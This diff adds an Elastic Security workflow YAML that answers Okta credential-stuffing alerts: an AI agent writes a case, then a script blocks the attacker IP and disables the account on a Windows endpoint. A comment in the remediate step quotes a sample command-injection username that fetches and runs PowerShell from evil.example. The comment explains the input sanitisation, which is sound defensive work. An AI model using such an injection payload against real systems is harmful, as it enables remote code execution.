@@ -1,0 +1,196 @@
+# Okta Credential Stuffing Response
+#
+# Source: elastic-security-ai-rule-creation-demo (terraform/workflows/okta-credential-stuffing.yaml)
+#
+# WHAT THIS DOES
+# Fires when an Okta credential-stuffing / account-takeover detection rule
+# raises an alert. An Agent Builder agent writes up the Security Case
+# (in-progress, alert attached, attacker IP + compromised account pinned as
+# observables, analysis comment), the workflow finds the one enrolled Windows
+# endpoint, runs a remediation script against it (block IP + disable account),
+# adds a comment summarising the remediation, and closes the case.
+#
+# PREREQUISITES
+#
+# 1. Elastic Security enabled, with the Okta integration installed so that
+#    `logs-okta.system-default` exists. Sample document the detection rule and
+#    this workflow expect (trimmed to the referenced fields):
+#      {
+#        "@timestamp": "2026-11-20T09:58:03.000Z",
+#        "event.action": "user.session.start",
+#        "okta.event_type": "user.session.start",
+#        "okta.outcome.result": "FAILURE",
+#        "okta.outcome.reason": "INVALID_CREDENTIALS",
+#        "okta.actor.alternate_id": "j.doe@example.com",
+#        "okta.client.ip": "203.0.113.7"
+#      }
+#    The underlying detection rule must correlate four stages for the same
+#    user+IP: repeated INVALID_CREDENTIALS, MFA failures, a successful login,
+#    then a post-compromise action (privilege grant / policy update) — the
+#    workflow just reads whatever counts the rule put on the alert
+#    (failed_login_count, mfa_failure_count, successful_login_count,
+#    post_compromise_count — all optional, defaulted to 'unknown' if absent).
+#
+# 2. An Agent Builder agent named `case-writer` with access to the Cases tools
+#    (create case, pin observable, add comment, mark in-progress). It must
+#    return structured_output.case_id (see the `schema` under write_case).
+#
+# 3. consts.script_id must be set to the UUID of a response-action script in
+#    the Kibana Script Library named something like
+#    `remediate-okta-compromise.ps1`, which takes `-SourceIP` and
+#    `-CompromisedUser` parameters and is expected to block the IP at the
+#    Windows Firewall and disable the local account.
+#
+# 4. Fleet must have at least one Windows endpoint enrolled with Elastic
+#    Defend (status online) for `find_agent`'s kuery to match — in the
+#    original demo this is a single VM, e.g. "secdemo-vm". If none match,
+#    `steps.find_agent.output.items[0].id` is empty and `remediate` will fail.
+#
+# NOTE ON syncAlerts: the case is created with syncAlerts: false deliberately.
+# If it were true, closing the case would close the alert, which would drop it
+# out of rule alert-suppression and let the same seed data re-trigger the rule
+# (and this workflow) on every run while it's still in the lookback window.
+
+version: '1'
+name: Okta Credential Stuffing Response
+enabled: true
+description: >-
+  Triggered by the Okta credential stuffing detection rule. The case-writer Agent
+  Builder agent creates the Security Case (in-progress, alert attached, attacker IP and
+  compromised account pinned as observables, analysis comment added). The workflow then
+  locates the enrolled Windows endpoint via Fleet, runs the remediate-okta-compromise
+  runscript against it, adds a remediation comment and closes the case.
+
+triggers:
+  - type: alert
+
+# A const, not an input: alert-triggered runs receive no inputs, so an input
+# default is never applied and the remediate step got an empty scriptId.
+consts:
+  script_id: "REPLACE_WITH_SCRIPT_LIBRARY_UUID"
+
+steps:
+  # ============================================================================
+  # STEP 1: Hand the alert to the case-writer Agent Builder agent
+  #
+  # The agent creates the case (tags, severity, syncAlerts: false), marks it
+  # in-progress, attaches the alert, pins the attacker IP and compromised
+  # account as observables, and adds the analysis comment, using its Cases
+  # tools. It returns the case ID for the remaining steps.
+  #
+  # syncAlerts is false so closing the case does not close the alert: a closed
+  # alert is ignored by rule alert suppression, so the rule would raise a new
+  # alert (and re-run this workflow) every interval while the seed data is in
+  # the lookback.
+  # ============================================================================
+  - name: write_case
+    type: ai.agent
+    agent-id: case-writer
+    with:
+      message: |
+        Write the case for this Okta credential stuffing / account takeover alert.
+
+        Case requirements:
+        - Title: "Okta Account Takeover: <okta.actor.alternate_id>"
+        - Severity: critical
+        - Tags: okta, credential-stuffing, account-takeover, T1110.004, T1078, T1098, automated
+        - Detection logic: the same user and source IP completed a four-stage chain -
+          failed logins (INVALID_CREDENTIALS), then MFA failures, then a successful
+          login, then a post-compromise action (privilege grant or policy update).
+        - Observables: okta.client.ip as the attacker IPv4 (credential stuffing source),
+          okta.actor.alternate_id as the compromised account email.
+        - Supporting logs, if you want to query them: logs-okta.system-default, grouped
+          by okta.actor.alternate_id and okta.client.ip.
+        - Automated remediation (Windows Firewall block of the IP and disabling the
+          matching local account) runs after you finish.
+
+        Alert document(s):
+        {{ event.alerts | json }}
+
+        Attack stage counts:
+        - Failed logins (INVALID_CREDENTIALS): {{ event.alerts[0].failed_login_count | default: 'unknown' }}
+        - MFA failures: {{ event.alerts[0].mfa_failure_count | default: 'unknown' }}
+        - Successful logins: {{ event.alerts[0].successful_login_count | default: 'unknown' }}
+        - Post-compromise events: {{ event.alerts[0].post_compromise_count | default: 'unknown' }}
+      schema:
+        type: object
+        properties:
+          case_id:
+            type: string
+            description: The UUID of the case that was created
+        required:
+          - case_id
+
+  # ============================================================================
+  # STEP 2: Resolve the Fleet agent ID for the enrolled Windows endpoint
+  #
+  # Finds the first online Windows Fleet agent. The Elastic Cloud-hosted Fleet
+  # Server agent is also online (Linux, no Elastic Defend), so the query must
+  # filter on OS. In this demo there is one enrolled Windows endpoint (secdemo-vm).
+  # ============================================================================
+  - name: find_agent
+    type: kibana.request
+    with:
+      method: GET
+      path: '/api/fleet/agents?perPage=1&kuery=status%3Aonline%20and%20local_metadata.os.platform%3Awindows'
+
+  # ============================================================================
+  # STEP 3: Run the remediation script against the resolved endpoint
+  # ============================================================================
+  - name: remediate
+    type: kibana.request
+    with:
+      method: POST
+      path: /api/endpoint/action/run_script
+      body:
+        alert_ids:
+          - "{{ event.alerts[0]._id }}"
+        agent_type: endpoint
+        endpoint_ids:
+          - "{{ steps.find_agent.output.items[0].id | default: '' }}"
+        parameters:
+          scriptId: "{{ consts.script_id }}"
+          # okta.actor.alternate_id is the Okta username, which in a credential-stuffing
+          # attack is attacker-chosen — spraying a value like
+          #   foo" ; Invoke-WebRequest evil.example/x.ps1 | iex #
+          # straight into this unquoted command-line string would let the attacker's own
+          # spray attempt run arbitrary PowerShell on the Windows endpoint. Both fields are
+          # quoted and stripped of the characters that break out of a double-quoted
+          # PowerShell string or chain a second statement (", `, ;, |, $, newlines) before
+          # being interpolated. This is defense in depth, not a substitute for
+          # remediate-okta-compromise.ps1 itself declaring typed parameters
+          # (e.g. [ipaddress]$SourceIP, [string]$CompromisedUser) so PowerShell rejects
+          # anything that still gets through malformed.
+          scriptInput: >-
+            -SourceIP "{{ event.alerts[0].okta.client.ip | replace: '"', '' | replace: '`', '' | replace: ';', '' | replace: '|', '' | replace: '$', '' | strip_newlines }}"
+            -CompromisedUser "{{ event.alerts[0].okta.actor.alternate_id | replace: '"', '' | replace: '`', '' | replace: ';', '' | replace: '|', '' | replace: '$', '' | strip_newlines }}"
+        comment: "Triggered by workflow '{{ workflow.name }}'"
+
+  # ============================================================================
+  # STEP 4: Remediation summary comment
+  # ============================================================================
+  - name: remediation_comment
+    type: cases.addComment
+    with:
+      case_id: "{{ steps.write_case.output.structured_output.case_id }}"
+      comment: |
+        ## Automated Remediation Complete
+
+        `remediate-okta-compromise.ps1` ran against the enrolled Windows endpoint:
+
+        - Blocked `{{ event.alerts[0].okta.client.ip }}` at the Windows Firewall
+        - Disabled local account `{{ event.alerts[0].okta.actor.alternate_id | split: '@' | first }}`
+
+        Script output:
+        ```
+        {{ steps.remediate.output | default: 'No output captured' }}
+        ```
+
+  # ============================================================================
+  # STEP 5: Close the case — remediation complete
+  # ============================================================================
+  - name: close_case
+    type: cases.setStatus
+    with:
+      case_id: "{{ steps.write_case.output.structured_output.case_id }}"
+      status: closed
